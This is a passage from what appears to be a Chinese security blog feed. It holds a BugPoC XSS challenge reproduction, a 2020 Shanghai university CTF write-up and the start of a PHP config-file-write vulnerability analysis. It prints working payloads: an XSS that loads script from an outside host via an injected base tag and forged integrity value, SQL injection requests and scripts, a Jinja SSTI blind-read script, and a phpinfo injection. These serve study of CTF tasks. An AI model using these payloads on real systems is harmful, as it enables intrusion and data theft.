iframe</span></span></span><br><span class="line"><span class="javascript">				analyticsFrame = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'sandbox'</span>, <span class="string">'allow-scripts allow-same-origin'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'class'</span>, <span class="string">'invisible'</span>);</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.body.appendChild(analyticsFrame);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">				<span class="comment">// securely add the analytics code into iframe</span></span></span><br><span class="line"><span class="javascript">				script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'src'</span>, <span class="string">'files/analytics/js/frame-analytics.js'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'integrity'</span>, <span class="string">'sha256-'</span>+fileIntegrity.value);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'crossorigin'</span>, <span class="string">'anonymous'</span>);</span></span><br><span class="line">				analyticsFrame.contentDocument.body.appendChild(script);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.body.innerHTML = <span class="string">`</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>This page can only be viewed from an iframe.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"400"</span> <span class="attr">controls</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">				<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;/<span class="name">video</span>&gt;</span>`</span></span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>只有在<code>window.name</code>为<code>iframe</code>时才会创建一个<code>iframe</code>标签，只可以通过如下<code>payload</code>来绕过，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="actionscript">location.href = <span class="string">"https://wacky.buggywebsite.com/frame.html?param=xss"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并在<code>&lt;iframe&gt;</code>标签中添加了<code>sandbox</code>属性，</p>
<blockquote>
<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119142538319.png" alt="image-20201119142538319" style="zoom:150%;">
</blockquote>
<p>之后还会添加一个<code>script</code>标签到其中，其中src是采用的相对路径，还利用了<code>integrity</code>来确保资源的完整性。之后我们寻找<code>https://wacky.buggywebsite.com/frame.html?param=xss</code>链接中的xss注入点，发现可以通过<code>&lt;/title&gt;</code>标签来闭合前面的标签，然后插入html代码，</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119105856645.png" alt="image-20201119105856645"></p>
<p>但是因为存在CSP，不能执行</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110041168.png" alt="image-20201119110041168"></p>
<p>查看对应的CSP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src &#39;nonce-syvmzvejfjgs&#39; &#39;strict-dynamic&#39;; frame-src &#39;self&#39;; object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110704352.png" alt="image-20201119110704352"></p>
<p>可以插入<code>&lt;base&gt;</code>标签，url定义为我们自己的VPS，然后在<code>files/analytics/js/frame-analytics.js</code>中插入xss代码，因为源码中是将<code>window.fileIntegrity.value</code>来当<code>&lt;script&gt;</code>标签的<code>integrity</code>值，如下<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119111714068.png" alt="image-20201119111714068" style="zoom:200%;"></p>
<blockquote>
<h1 id="Subresource-Integrity"><a href="#Subresource-Integrity" class="headerlink" title="Subresource Integrity"></a>Subresource Integrity</h1><p><strong>子资源完整性</strong>(SRI)是允许浏览器检查其获得的资源（例如从 <a href="https://developer.mozilla.org/en-US/docs/Glossary/CDN" target="_blank" rel="noopener">CDN</a> 获得的）是否被篡改的一项安全特性。它通过验证获取文件的哈希值是否和你提供的哈希值一样来判断资源是否被篡改。</p>
<p>将使用 base64 编码过后的文件哈希值写入你所引用的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script" target="_blank" rel="noopener"><code>&lt;script&gt;</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" target="_blank" rel="noopener"><code>&lt;link&gt;</code></a> 标签的 <strong>integrity</strong> 属性值中即可启用子资源完整性功能。</p>
<p>integrity 值分成两个部分，第一部分指定哈希值的生成算法（目前支持 sha256、sha384 及 sha512），第二部分是经过 base64 编码的实际哈希值，两者之间通过一个短横（-）分割。</p>
</blockquote>
<p>所以可以通过注入下面代码绕过，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'aErQrfRCGgdInIpMEDCWj2%2bHQUab648smjdgPAUdBKU='</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112037023.png" alt="image-20201119112037023"></p>
<p>利用BugPoC生成payload。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"Access-Control-Allow-Origin"</span>:<span class="string">"*"</span>,</span><br><span class="line">	<span class="attr">"Content-type"</span>:<span class="string">"text/javascript"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112633325.png" alt></p>
<p>最后payload:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">location.href = "https://wacky.buggywebsite.com/frame.html?param=<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'QkIPs1Inueee8IH+HXpScbWfI0zPgWJvCB9LGWZH/Wc='</span>&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">'https://0vc3zrq6aqua.redir.bugpoc.ninja/'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112858083.png" alt="image-20201119112858083"></p>
<p>参考链接</p>
<p><a href="https://jinone.github.io/BugPoc-XSS-Challenge/" target="_blank" rel="noopener">BugPoc XSS Challenge</a></p>
<p><a href="https://www.srihash.org/" target="_blank" rel="noopener">https://www.srihash.org/</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7</a></p>
]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>2020上海市大学生网络安全大赛部分wp</title>
    <url>/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&amp;miscWP/</url>
    <content><![CDATA[<p>2020上海市大学生网络安全大赛部分wp</p>
<a id="more"></a>

<h1 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h1><p>这题很迷，开始时候扫了一次，没有扫出来<a href="http://www.zip，后来就扫出来了" target="_blank" rel="noopener">www.zip，后来就扫出来了</a></p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114193038409.png" alt="image-20201114193038409"></p>
<p>有一个变量覆盖，过滤了<code>&#39;</code> <code>union</code>等，大致思路是通过第一个循环将<code>$_POST[&#39;code&#39;]</code>置<code>NULL</code>掉，通过<code>filter()</code>的过滤，然后通过<code>extract($_GET,EXTR_SKIP);</code>，给<code>$_POST[&#39;code&#39;]</code>重新赋值，进行注入，之后就是常规的联合注入了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?_POST[code]&#x3D;114514&#39;%20and%200%20union%20select%20user(),1,flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag%23 HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zehpt4jc1z3lyl83iz5.cloudeci1.ichunqiu.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.198 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: UM_distinctid&#x3D;1755a6e9ee915c-054346254fd387-303464-168000-1755a6e9eeaab8; chkphone&#x3D;acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O;_POST[code]&#x3D;1145</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">code&#x3D;1145</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114193454149.png" alt="image-20201114193454149"></p>
<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>读完源码可知，404页面有SSTI，fuzz读文件，这里可以通过<code>/proc/self/fd/3</code>读到删除的文件</p>
<p>然后用脚本盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://eci-2zegdefmmywv7mh25iet.cloudeci1.ichunqiu.com:8888/eee'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(payload)</span>:</span></span><br><span class="line">    postdata = payload</span><br><span class="line">    r = requests.post(url, data=postdata,headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>&#125;).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'1'</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">''</span></span><br><span class="line">s = <span class="string">r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-%'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#&#123;%if().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__['open']('/proc/self/fd/3').read()[:5]=="flag&#123;" %&#125;1&#123;% endif %&#125;</span></span><br><span class="line">        payload = <span class="string">'&#123;% if ().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[\'open\'](\'/proc/self/fd/3\').read()['</span>+str(i)+<span class="string">':'</span>+str(i+<span class="number">1</span>)+<span class="string">'] == "'</span>+c+<span class="string">'" %&#125;1&#123;% endif %&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194157205.png" alt="image-20201114194157205"></p>
<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>都配置文件</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194615848.png" alt="image-20201114194615848"></p>
<p>得到网站根目录，读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">'/flag/is'</span>, $_GET[<span class="string">'file'</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> file_get_contents(<span class="string">'/'</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">                $user = <span class="keyword">new</span> user;</span><br><span class="line">                $login = $user-&gt;login();</span><br><span class="line">                <span class="keyword">if</span>($login)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="row clearfix"&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class="col-md-12 column"&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class="alert alert-dismissable alert-info"&gt;</span></span><br><span class="line"><span class="string">                                    &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;×&lt;/button&gt;</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;</span></span><br><span class="line"><span class="string">                                        恭喜!</span></span><br><span class="line"><span class="string">                                    &lt;/h4&gt; &lt;strong&gt;Success!&lt;/strong&gt;登录成功了！</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="row clearfix"&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class="col-md-12 column"&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class="alert alert-dismissable alert-danger"&gt;</span></span><br><span class="line"><span class="string">                                    &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;×&lt;/button&gt;</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;</span></span><br><span class="line"><span class="string">                                        注意!</span></span><br><span class="line"><span class="string">                                    &lt;/h4&gt; &lt;strong&gt;Wrong!&lt;/strong&gt;用户名或密码错误！Need help?</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;!-- /?file=xxx 请使用绝对路径--&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'root'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">'qwertyu'</span>;</span><br><span class="line">    <span class="keyword">public</span> $database = <span class="string">'test'</span>;</span><br><span class="line">    <span class="keyword">private</span> $mysqli = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = mysqli_connect(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hostname,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line">        mysqli_select_db(<span class="keyword">$this</span>-&gt;mysqli,<span class="keyword">$this</span>-&gt;database);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_POST[<span class="string">'username'</span>] = addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $_POST[<span class="string">'password'</span>] = addslashes($_POST[<span class="string">'password'</span>]);</span><br><span class="line">        $safe1 = preg_match(<span class="string">'/inn|or/is'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $safe2 = preg_match(<span class="string">'/inn|or/is'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($safe1 === <span class="number">0</span> <span class="keyword">and</span> $safe2 === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'No hacker!'</span>);</span><br><span class="line">        &#125;	    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter();</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        $sql = <span class="string">"select * from user where username='%s' and password='$password'"</span>;</span><br><span class="line">        $sql = sprintf($sql,$username);</span><br><span class="line">        print_r($sql);</span><br><span class="line">        $result = mysqli_query(<span class="keyword">$this</span>-&gt;mysqli,$sql);</span><br><span class="line">        $result = mysqli_fetch_object($result);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;id)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>读文件可得，sql注入格式化，逃逸单引号，bypass or,然后无列名注入，得到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://eci-2zejdvvwkqa12mptvclx.cloudeci1.ichunqiu.com/index.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		<span class="comment">#payload=r"id=\\0&amp;path=or 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+" #65</span></span><br><span class="line">		<span class="comment">#payload=r"id=\\0&amp;path=or 1=(ascii(mid((select/**/group_concat(column_NAME)/**/from/**/information_schema.columnS/**/where/**/table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+"</span></span><br><span class="line">		payload=<span class="string">r"type=2&amp;imei=\" and if((ascii(mid((select password from users limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(1000000,sha(1)),0)#"</span></span><br><span class="line">		payload=<span class="string">"type=2&amp;imei=\" and if((ascii(mid((user()),&#123;&#125;,1))&gt;&#123;&#125;),benchmark(1000000,sha(1)),0)#"</span></span><br><span class="line">		payload=<span class="string">"(ascii(mid((select/**/group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		payload=<span class="string">"(ascii(mid((select x.1 from(select 1 union select * from fl4g)x limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		<span class="comment">#payload="(ascii(mid((select username ),&#123;&#125;,1))&gt;&#123;&#125;)"</span></span><br><span class="line">		url_1=url</span><br><span class="line">		data = &#123;<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"%1$' || "</span>+payload.format(i,mid)+<span class="string">"#"</span>&#125;</span><br><span class="line">		r=requests.post(url_1,data=data,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Success!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			low=mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"><span class="comment">#(select x.2 from(select 1,2,3 union select * from user)x)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114195244441.png" alt="image-20201114195244441"></p>
<h1 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h1><p>用wireshark打开，筛选出DNP3.0协议，追踪流发现规律</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194124842.png" alt="image-20201114194124842"></p>
<p>然后写脚本跑</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194347238.png" alt="image-20201114194347238"></p>
<h1 id="pcap-analysis"><a href="#pcap-analysis" class="headerlink" title="pcap analysis"></a>pcap analysis</h1><p>和上题一样</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194531922.png" alt="image-20201114194531922"></p>
<p>直接手敲。。。。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>配置文件任意写漏洞分析</title>
    <url>/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>寒假在家时看了P牛的<a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a>，一直到开学都没有仔细去分析其中的原理。最近又看到了，还是好好地分析一下吧。</p>
<a id="more"></a>

<p>P牛在文章中把这类漏洞分了</p>
<h1 id="0x01-贪婪模式无s"><a href="#0x01-贪婪模式无s" class="headerlink" title="0x01 贪婪模式无s"></a>0x01 贪婪模式无s</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//option.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$API = <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;%27;%0aphpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>因为<code>phpinfo();</code>后面有单引号，所以需要注释掉。</p>
</blockquote>
<img src="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201108205228223.png" alt="image-20201108205228223" style="zoom: 200%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.59.156&#x2F;test.php?api&#x3D;aa</span><br></pre></td></tr></table></figure>
</blockquote>
